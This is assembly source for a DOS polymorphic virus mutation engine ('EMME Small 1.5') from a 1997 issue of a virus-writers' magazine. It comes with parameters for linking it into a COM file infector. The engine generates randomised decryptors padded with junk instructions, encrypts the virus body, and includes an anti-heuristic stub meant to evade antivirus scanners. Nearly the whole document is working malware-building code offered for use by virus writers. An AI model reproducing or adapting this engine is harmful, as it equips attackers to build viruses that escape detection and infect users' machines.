;      ‹‹                  €
;     ﬂﬂﬂ  Virus Magazine  € Box 176, Kiev 210, Ukraine      IV  1997
;     ﬂ€€ ﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂ € ﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂ ﬂ ﬂﬂﬂﬂﬁﬂﬂﬂ  €ﬂﬂﬂﬂﬂﬂ€
;      ﬁ€ €ﬂ‹ €ﬂﬂ ‹ﬂﬂ ‹ﬂﬂ ‹€‹ ‹ﬂﬂ €ﬂ€    › € ‹ﬂ€ € ‹ﬂﬂ €‹‹   € ﬂﬂﬂ€ €
;       € € € €ﬂ  €ﬂ  €    €  €ﬂ  € €    € € € € € €   €     € ‹‹‹€ €
;       € ﬁ ﬁ ﬁ   ﬁ‹‹ ﬁ‹‹  ﬁ  ﬁ‹‹ ﬁ‹ﬂ     ﬂ€ ﬂ‹€ ﬁ ﬁ‹‹ ﬁ‹‹‹  € €‹‹‹ €
;       ﬁ ‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹ ‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹  €‹‹‹‹‹‹€
;          (C) Copyright, 1994-97, by STEALTH group WorldWide, unLtd.
;                             sgww@hotmail.com
;            Digest of IV 8 - 11 russian, including Moscow issues

        .model tiny
        .code
        extrn SaveOff,CrLen
        public Emme11
Emme11:
        call modulof
modulof:
        pop  bp
        sub  bp,3
        in   ax,40h
        add  word ptr ds:[bp+offset Seed - Emme11],ax
;       push word ptr ds:[bp+offset Seed - Emme11]      ; ***
;------------------------------------------------------------------------
;       PARAMETERS:
;       ES - points to buffer of proper size.
;       DS - points to segment of code to be encrypted.
;       SI - offset of code to be crypted.
;       CrLen - number of words (NOT BYTES!!!) to be crypted.
;       SaveOff - delta offset in file (Length + 100h for appending
;                                       COM infector, for example)
;
;       When finished:
;       ÖS:0 - crypted code.
;       DI - its size in bytes.
;------------------------------------------------------------------------
;       A structure of decryptor:
;       -------------------------
;
;       mov     reg1,offcode    ; offcode - offset of crypted code
;       mov     reg2,-CrLen
;       mov     reg3,code_1
;Decode:
;       oper1   word ptr ds:[reg1],reg3
;       inc     reg1
;       inc     reg1
;       oper2   reg3,code_2
;       inc     reg2
;       jnz     Decode
;
;       --------------------------------
;
;       reg1        - SI,DI,BX or BP
;       reg2,reg3   - AX,BX,CX,DX,BP,SI or DI
;       oper1       - XOR,ADD or SUB
;       oper2       - ADD or SUB
;
;       code_1,code_2 - random numbers
;
;     All unused in decryptor registers are used in garbage instructions.
;------------------------------------------------------------------------
PolyStart:
        push si

        xor  di,di

        mov  bx,127
        call NoRnd

        call makeini

        inc  byte ptr [bp+offset Reg - Emme11]

        lea  si,[bp+offset anti-Emme11]
        mov  cx,05h
AntiHer:
        cmp  cl,2
        jne  noGlue
        mov  al,75h
        stosb
        push di
        inc  di
noGlue:
        call make
        movsw
        loop AntiHer

        pop  bx
        mov  ax,di
        sub  ax,bx
        dec  ax
        dec  ax
        dec  ax
        mov  byte ptr es:[bx],al

;---------------------------------------------
;       Creating a decryptor
;---------------------------------------------

        call makeini

;---------------------------------------------
;       First instruction
;---------------------------------------------
instr1:
        call ZeroTwo

        mov  al,byte ptr ds:[bx+offset Pack_1-Emme11]
        stosb
        push di         ; Needed for decryptor
        stosw           ; To reserve a place for offset
        mov  al,byte ptr ds:[bx+3+offset Pack_1-Emme11]
        mov  byte ptr ds:[si+1],al
        mov  al,byte ptr ds:[bx+6+offset Pack_1-Emme11]
        mov  ah,al
        mov  word ptr ds:[si+2],ax
        sub  al,40h
        mov  bl,al
        call _fill      ; Make a register busy
        call make
;-----------------------------------------------
;       Second instruction
;-----------------------------------------------
instr2:
        call f_reg
        add  bl,48h
        mov  byte ptr ds:[si+7],bl

        mov  bl,10h
        call rnd
        mov  ax,CrLen
        add  ax,bx

        stosw

        call make
;------------------------------------------------
;       Third instruction
;------------------------------------------------
instr3:
        call f_reg

        mov  byte ptr ds:[si+5],bl

        mov  al,8
        mul  bl
        add  byte ptr ds:[si+1],al
        mov  ax,word ptr ds:[bp+offset Seed - Emme11]
        stosw
        push di
        mov  word ptr ds:[bp+offset encryptor - Emme11 - 3],ax
        call make
;--------------------------------------------------
;       To choose operations
;--------------------------------------------------
        call ZeroTwo

        mov  al,byte ptr ds:[offset mirror1 - Emme11 + bx]
        mov  byte ptr ds:[si],al
        sub  bx,bp
        neg  bx
        add  bx,bp
        mov  al,byte ptr ds:[offset mirror1 - Emme11 + bx + 2]
        mov  byte ptr ds:[bp+offset encryptor-Emme11+2],al

        mov  bl,2
        call rnd

        add  bx,bp
        mov  al,byte ptr ds:[offset mirror2 - Emme11 + bx]
        add  byte ptr ds:[si+5],al
        add  al,3
        mov  byte ptr ds:[bp+offset encryptor-Emme11+6],al

;-----------------------------------------------------
;       To copy rest of decryptor
;-----------------------------------------------------
        movsw
        call make
        movsb
        call make
        movsb
        call make
        movsw
        call RndAx
        mov  byte ptr ds:[bp+offset encryptor - Emme11 + 7],al
        stosb
        inc  si
        call make
        movsw
        mov  ax,0FFh
        sub  ax,di
        pop  bx
        add  ax,bx      ; BYTE for JNZ instruction
        stosb
        call makeini

        pop  si
        mov  ax,word ptr ds:[SaveOff]
        add  ax,di
        mov  word ptr es:[si],ax        ; Offset of crypted code


        mov  cx,CrLen
        mov  bx,0FFFFh
        pop  si
encryptor:
        movsw
        xor  word ptr es:[di-2],bx
        sub  bx,0
        loop encryptor

;       pop  word ptr ds:[bp+offset Seed - Emme11]      ; ***
        ret

makeini:
        mov  byte ptr ds:[bp+offset Reg - Emme11],10h
make:
;-----------------------
; Makes from 1 up to 16
; bytes of garbage code
;-----------------------
        mov  bl,14h
        call rnd
NoRnd:
        mov  dx,bx
        inc  dx
poly:
        push dx
GenMov:
        cmp  dx,3
        jb   GenCmp

        call _free
        jnz  GenCall
        mov  al,0B8h
        add  al,bl
        stosb
        call RndAx
        stosw
        sub  dx,3
GenCall:
        cmp  dx,20h
        jb   GenCmp
        mov  al,0E8h
        stosb
        mov  bl,10h
        call rnd
        mov  ax,bx
        sub  dx,ax
        push dx
        mov  dx,ax
        inc  ax
        inc  ax
        stosw
        call poly
        pop  dx
        mov  al,0EBh
        stosb
        push di
        inc  di
        sub  dx,6
        mov  bx,dx
        call rnd
        sub  dx,bx
        dec  dx
        push dx
        call NoRnd
        pop  bx
        mov  al,0c3h
        stosb
        pop  si
        inc  dx
        mov  byte ptr es:[si],dl
        mov  dx,bx
GenCmp:
        cmp  dx,10h
        jb   GenInt
        call rnd8
        or   bl,bl
        jnz  NotAx

        mov  al,03dh
        stosb
        jmp  short RandWord
NotAx:
        mov  ax,0f881h
        add  ah,bl
        stosw
        dec  dx
RandWord:
        call RndAx
        stosw
        and  al,0Fh
        add  al,70h
        push ax
        mov  bl,0Ah
        call rnd
        pop  ax
        mov  ah,bl
        inc  ah
        stosw
        sub  dx,6
        sub  dx,bx
        push dx
        call NoRnd
        pop  dx
GenInt:
        cmp  dx,4
        jb   form_3
        cmp  byte ptr ds:[bp+offset Reg - Emme11],10h
        jne  GenMem
        mov  bl,5
        call rnd
        add  bx,bp
        mov  ah,byte ptr ds:[bx+offset IntByte - Emme11]
        mov  al,0b4h
        stosw
        mov  ax,21cdh
        stosw
        sub  dx,4
GenMem:
        cmp  dx,5
        jb   NoMem
        call _free
        jnz  NoMem
        mov  al,8
        mul  bl
        add  al,06
        xchg ah,al
        push ax
        call RndAx
        test al,2
        jz   NotCS
        mov  al,02Eh
        stosb
        dec  dx
NotCS:
        test al,1
        jz   NotES
        mov  al,026h
        stosb
        dec  dx
NotES:
        call rnd8
        pop  ax
        add  bx,bp
        mov  al,byte ptr ds:[bx+offset Data_2 - Emme11]
        stosw
        call RndAx
        cmp  ax,0FFFFh
        jne  OffOk
        dec  ax
OffOk:
        stosw
        sub  dx,4
NoMem:
;-------------------------------------
;       Generate 4-bytes command
;-------------------------------------
        cmp  dx,4
        jb   form_3

        call chose
        jnz  form_3

        or   bl,bl
        jnz  bytes_4
        sub  ah,0bbh
        xchg ah,al
        stosb
        inc  dx
        jmp  short bytes_3
bytes_4:
        add  ah,bl
        mov  al,81h
        stosw
bytes_3:
        call RndAx
        stosw
        sub  dx,4
form_3:
;-------------------------------------
;       Generate 3-bytes command
;-------------------------------------
        cmp  dx,3
        jb   form_2

        call chose
        jnz  form_2

        add  ah,bl
        mov  al,83h
        stosw
        call RndAx
        stosb
        sub dx,3
form_2:
;-------------------------------------
;       Generate 2-bytes command
;-------------------------------------
        cmp  dx,2
        jb   GenXchg

        call _free
        jnz  GenXchg

        mov  al,8
        mul  bl
        add  al,0C0h
        push ax
        call rnd8
        pop  ax
        add  al,bl
        xchg ah,al

        add  bx,bp
        mov  al,byte ptr ds:[bx+offset data_2-Emme11]
        stosw
        dec  dx
        dec  dx
GenXchg:
        cmp  dx,2
        jb   GenIncDec

        call _free
        jnz  GenIncDec

        or   bl,bl
        jnz  bytes_2
        mov  al,90h
        jmp  short bytes_1
bytes_2:
        mov  al,087h
        stosb
        dec  dx
        mov  al,8
        mul  bl
        add  al,0C0h
bytes_1:
        push ax
        call _free
        pop  ax
        jnz  bytes_1

        or   bl,bl
        jz   bytes_1

        add  al,bl
        stosb
        dec  dx
GenIncDec:
        or   dx,dx
        jz   PolyStop

        call _free
        jnz  form_1
        mov  al,40h
        add  al,bl
        push ax
        mov  bl,2
        call rnd
        pop  ax
        test bl,1
        jnz  GenInc
        add  al,8
GenInc:
        stosb
        dec  dx
;------------------------------------
;       Generate 1-byte command
;------------------------------------
form_1:
        or   dx,dx
        jz   PolyStop
        call rnd8

        add  bx,bp
        mov  al,byte ptr ds:[bx+offset data_1-Emme11]
good_1:
        stosb
        dec  dx
        jmp  GenMov
PolyStop:
        pop  dx
        ret
ZeroTwo:
        mov  bl,3
        call rnd
        add  bx,bp
        ret

;-----------------------------------------------------------------
Reg     db      10h     ; This byte is to mark registers
                        ; involved in decryptor.
                        ; 10h means don't use SP as a garbage
                        ; register ;)
;-----------------------------------------------------------------
;       Data for polymorphic engine
;-----------------------------------------------------------------
        data_1   db  0f5h,0f8h,0f9h,0fbh,0fch,0fdh,09eh,090h
        data_2   db  03h,0bh,013h,01bh,023h,02bh,033h,03bh
pack_1:
        mov_reg1 db  0beh,0bfh,0bbh
        xor_reg1 db  04h,05h,07h
        inc_reg1 db  046h,047h,043h
operations:
        mirror1  db  01h,031h,029h
        mirror2  db  0c0h,0e8h
        IntByte  db  030h,062h,02Ah,051h,02Ch
;-------------------------------------------------------------------
db      'EMME Small 1.5'    ; Small Eternal Maverick Mutation Engine
;-------------------------------------------------------------------
_free:
        call rnd8
IsFree:
        push bx
        push cx
        mov  cl,bl
        mov  bl,1
        shl  bl,cl
        test byte ptr ds:[bp+offset Reg-Emme11],bl
        jmp  short popcxbx
f_reg:
        call _free
        jnz  f_reg
        mov  al,0B8h
        add  al,bl
        stosb
_fill:
        push bx
        push cx
        mov  cl,bl
        mov  bl,1
        shl  bl,cl
         or  byte ptr ds:[bp+offset Reg-Emme11],bl
popcxbx:
        pop  cx
        pop  bx
        ret
Chose:
        call rnd8
        mov  al,8
        mul  bl
        add  al,0C0h
        xchg ah,al
        push ax
        call _free
        pop  ax
        ret
rnd8:
        mov  bl,8
rnd:
;---------------------------
; A bad way for getting a
; random number
;---------------------------
        push dx
        mov  ax,word ptr ds:[bp+offset Seed-Emme11]
        mov  dx,25173
        mul  dx
        add  ax,13849
        pop  dx
        mov  word ptr ds:[bp+offset Seed-Emme11],ax
        xor  ax,word ptr ds:[bp+offset ForXor-Emme11]
        and  ax,255
        div  bl
        xor  bx,bx
        mov  bl,ah
        ret

Seed    dw   37849
ForXor  dw   559

RndAx:
        mov  ax,word ptr ds:[bp+offset Seed-Emme11]
        ret

;--------------------------------
; Built-in anti-heuristic,
; bad against DrWeb, but good
; againt some other antiviruses
;--------------------------------
anti:
        xor  ax,ax
        in   ax,40h
        or   ax,ax
        int  20h
        push cs
        pop  ds
;--------------------------------
;       Cryptor Pattern
;--------------------------------
Pattern:
        xor word ptr ds:[di],bx
        inc di
        inc di
        sub bx,0
        inc cx
        jnz Pattern
;----------------------------------------
;       End of Polymorphic Engine
;----------------------------------------
        end